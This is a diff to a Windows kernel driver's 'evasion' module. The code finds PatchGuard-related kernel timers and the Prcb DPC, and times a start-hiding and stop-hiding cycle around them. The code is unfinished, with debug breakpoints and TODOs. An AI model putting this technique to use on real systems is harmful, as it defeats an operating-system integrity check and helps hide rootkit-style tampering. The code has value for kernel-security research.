@@ -20,16 +20,20 @@ Global context for the evasion feature.
 */
 typedef struct _EVADE_CONTEXT
 {
-    /* Array of KTIMER */
+    /*
+    Array of PG-related KTIMERs. The array can contain up to 10 entries.
+    I'm using an array for this because I'm not 100% confident that only 2 timers
+    can exist at a time. If that's the case, this design is redundant and will change.
+    */
 #define MAX_PG_TIMERS 10
     PKTIMER Timers[MAX_PG_TIMERS];
     UINT32 TimerCount;
-
-    ULONGLONG CurrentTimer;
-
+    /* The expiration time of the Timer we're currently avoiding */
+    ULONGLONG LastAvoidedExpiration;
+    /* Define a Timer for starting the evasion process */
     KDPC StartEvasionDpc;
     KTIMER StartEvasionTimer;
-
+    /* Define a Timer for stopping the evasion process */
     KDPC StopEvasionDpc;
     KTIMER StopEvasionTimer;
 } EVADE_CONTEXT, PEVADE_CONTEXT;
@@ -99,7 +103,7 @@ UpdateTimers(
 }
 
 ULONGLONG
-GetEarliestTimer(
+EarliestTimerExpiration(
     VOID
 )
 {
@@ -114,12 +118,21 @@ GetEarliestTimer(
 
         ULONGLONG currentTime = currentTimer->DueTime.QuadPart;
 
+        if (currentTimer->Period)
+        {
+            /* BP if Timer is periodical. Need to figure out how to calculate the DueTime */
+            DbgBreakPoint();
+        }
+
         if (currentTime < earliestTime)
             earliestTime = currentTime;
     }
 
     return earliestTime;
 }
+
+/* Start hiding a bit earlier than the Timers expire */
+#define EVASION_TIMER_UNDERSHOOT 500
 
 BOOLEAN
 SetStopEvasionTimer(
@@ -144,6 +157,9 @@ StartEvasion(
     SetStopEvasionTimer();
 }
 
+#define AVOIDING_TIMER ((PVOID) 0x1)
+#define AVOIDING_DPC ((PVOID) 0x0)
+
 BOOLEAN
 SetStartEvasionTimer(
     BOOLEAN RequiresUpdate
@@ -153,10 +169,24 @@ SetStartEvasionTimer(
     if (RequiresUpdate && !UpdateTimers())
         return FALSE;
 
-    g_EvadeContext.CurrentTimer = GetEarliestTimer();
+    ULONGLONG timerExpiration = EarliestTimerExpiration();
+    ULONG dpcExecution = Flows::PrcbDpc::NextExecutionTime();
+
+    if (timerExpiration < dpcExecution)
+    {
+        g_EvadeContext.LastAvoidedExpiration = timerExpiration;
+        /* Indicate to the DPC that we're avoiding a Timer, and not the Prcb DPC */
+        g_EvadeContext.StartEvasionDpc.SystemArgument1 = AVOIDING_TIMER;
+    }
+    else
+    {
+        g_EvadeContext.LastAvoidedExpiration = dpcExecution;
+        /* Indicate to the DPC that we're avoiding the Prcb DPC, and not a Timer */
+        g_EvadeContext.StartEvasionDpc.SystemArgument1 = AVOIDING_DPC;
+    }
 
     LARGE_INTEGER startEvasionTime;
-    startEvasionTime.QuadPart = g_EvadeContext.CurrentTimer /* - 1000 something, so it's called earlier */;
+    startEvasionTime.QuadPart = g_EvadeContext.LastAvoidedExpiration - EVASION_TIMER_UNDERSHOOT;
 
     if (KeSetTimer(
         &g_EvadeContext.StartEvasionTimer,
@@ -182,33 +212,53 @@ VOID
 TryStopEvasion(
     PKDPC Dpc,
     PVOID DeferredContext,
-    PVOID SystemArgument1,
-    PVOID SystemArgument2
+    PVOID IsAvoidingTimer,
+    PVOID pvAttemptCount
 )
 {
     UNREFERENCED_PARAMETER(Dpc);
     UNREFERENCED_PARAMETER(DeferredContext);
-    UNREFERENCED_PARAMETER(SystemArgument1);
-    UNREFERENCED_PARAMETER(SystemArgument2);
 
+    /* Convert from PVOID to UINT64 */
+    UINT64 attemptCount = (UINT64) pvAttemptCount;
+
+    if (attemptCount >= 5)
+    {
+        /*
+        BP if we've attempted & failed more than 5 times.
+        TODO: Better error handling (log error to user, exit program?)
+        */
+        DbgBreakPoint();
+        goto Exit;
+    }
+
+    /* Increment attempt count. Why am I using global variables smh */
+    g_EvadeContext.StopEvasionDpc.SystemArgument2 = (PVOID) (attemptCount + 1);
+
+    /* Timer count before evasion started */
     UINT32 prevTimerCount = g_EvadeContext.TimerCount;
 
+    /* Search again for all PG related Timers */
     if (!UpdateTimers())
         return;
     
-    /* Ensure that previus Timer was actually removed */
-    if (g_EvadeContext.CurrentTimer == GetEarliestTimer())
+    /* If we're avoiding a Timer, ensure it was actually removed (it's no longer the earliest) */
+    if (IsAvoidingTimer == AVOIDING_TIMER &&
+        g_EvadeContext.LastAvoidedExpiration == EarliestTimerExpiration())
     {
-        /* Do other stuff, sleep longer maybe idk */
+        /* TODO: Maybe do other stuff, we can sleep longer or something */
         return;
     }
 
     /* Check that a new replacement Timer was inserted, i.e. execution finished */
     if (prevTimerCount == g_EvadeContext.TimerCount)
-    /* && CurrentTime < GetEarliestTimer(), make sure next Timer isn't pending or smth*/
+    /* && CurrentTime < GetEarliestTimer(), make sure next Timer isn't already executing? not sure if necessary */
     {
-        KeCancelTimer(&g_EvadeContext.StopEvasionTimer);
         StopEvasion();
+
+        Exit:
+        /* If we finished avoiding, cancel the Timer */
+        KeCancelTimer(&g_EvadeContext.StopEvasionTimer);
     }
 }
 
@@ -218,7 +268,12 @@ SetStopEvasionTimer(
 )
 {
     LARGE_INTEGER dueTime;
-    dueTime.QuadPart = /* CurrentInterruptTime + */ MS_TO_HNS(STOP_INITIAL_COOLOWN);
+    dueTime.QuadPart = /* CurrentTime + */ MS_TO_HNS(STOP_INITIAL_COOLOWN);
+
+    /* Notify StopEvasionDpc whether we're avoiding a Timer or the Prcb DPC */
+    g_EvadeContext.StopEvasionDpc.SystemArgument1 = g_EvadeContext.StartEvasionDpc.SystemArgument1;
+    /* Initialize attempt count to zero */
+    g_EvadeContext.StartEvasionDpc.SystemArgument2 = 0;
 
     if (KeSetTimerEx(
         &g_EvadeContext.StopEvasionTimer,
